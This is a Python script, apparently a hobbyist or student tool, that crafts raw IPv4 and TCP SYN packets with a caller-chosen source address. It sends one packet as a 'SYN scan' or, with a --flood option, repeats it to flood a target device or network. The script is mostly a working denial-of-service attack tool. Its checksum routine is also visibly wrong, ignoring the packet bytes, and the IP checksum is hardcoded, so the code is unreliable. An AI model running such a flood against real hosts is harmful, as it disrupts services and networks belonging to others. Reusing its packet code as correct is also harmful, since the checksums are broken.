#!/usr/bin/python3
import os
import socket
import sys
from struct import *
# argparser to take arguments correctly
import argparse
# Global list to store the error messages
error_msg = []

def createSock(s):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error as error_msg:
        print('Socket could not be created. Error code: ' + str(error_msg[0]) + ' Message ' + str(error_msg[1]))
    return s

# Calling of the function to create a socket
# Checksum which will be passed to verify - Contained in function with storage and access to a global list

# This function requires further research and correcting
def checksum(msg):
    s = 0
    len_msg = len(msg)
    # Loop to create range from 0 to length of the packet
    for i in range(0, len_msg, 2):
        w = (len_msg << 8) + (len_msg + 1)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

# IPV4 Packet creation 
def ipCreate(source_ip, dest_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet = ''
    # IP header fields
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20
    id = 54321
    frag_off = 0
    ttl = 255
    # Variable giving the socket a protocol of TCP
    protocol = socket.IPPROTO_TCP
    check = 10 # Checksum succession
    saddr = socket.inet_aton(source_ip)
    daddr = socket.inet_aton(dest_ip)

    ihl_version = (version << 4) + ihl

    # IP Header packed up
    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
    return ip_header

# TCP SYN Packet created using the function which is then fed to pack function, to pack in network bits
def tcpCreate(source_ip ,dest_ip, source_port, dest_port):
    seq = 0
    ack_seq = 0
    doff = 5
    #tcp flags
    fin = 0
    # Activation of syn packet to enable syn scan
    syn = 1
    # Reset flag
    rst = 0
    # Push flag
    psh = 0
    # ACKnowledgement flag
    ack = 0
    # Urgent flag
    urg = 0
    # Window size of the scan
    window = socket.htons(5480)
    check = 0
    # Urgent pointer
    urg_ptr = 0

    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

    # TCP Header packed
    tcp_header = pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)

    #pseudo header fields
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    #TCP Header assigned with TCP protocol
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
    psh += tcp_header

    # Checksum function using push flag
    tcp_checksum = checksum(psh)
    print(tcp_checksum)

    tcp_header = pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr)
    return tcp_header

# CHECK LOCAL UID AND PROVIDE RESTRICTION BANNER
def permissions():
    checkPerms = os.getuid()
    if checkPerms != 0:
        print("The logged in user is not root")
        sys.exit(0)
    else:
        return 0
    return checkPerms

def main():
    print(("Logged in user is {}".format(permissions())))
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    createSock(s)
    parser = argparse.ArgumentParser(description='SYN Scan and flood tool which forms raw packets taking required IP addresses and port numbers')
    parser.add_argument("sip", help='Source IP Address to form packet', type=str)
    parser.add_argument("dip", help='Destination IP address to form packet', type=str)
    parser.add_argument("sport", help='Source port to form packet', type=int)
    parser.add_argument("dport", help='Destination port to form packet', type=int)
    parser.add_argument("-f", "--flood", help="SYN Flood option to send arbituary number of packets to flood device or network", type=int)
    args = parser.parse_args()

    ip_header = ipCreate(args.sip, args.dip)
    tcp_header = tcpCreate(args.sip, args.dip, args.sport, args.dport)
    packet = ip_header + tcp_header
    print(args)
    if args.flood:
        i = 0
        value = int(args.flood)
        while i < value:
            i += 1
            print(("Packets sent: {}".format(i)))
            result = s.sendto(packet, (args.dip, 0))
    else:
        print("Flood option was not chosen, sending 1 packet to initiate SYN scan")
        result = s.sendto(packet, (args.dip, 0))

    # TO TEST THIS PROGRAM LAUNCH IN PYTHON AND OPEN WIRESHARK ON THE SPECIFIED NETWORK INTERFACE
main()
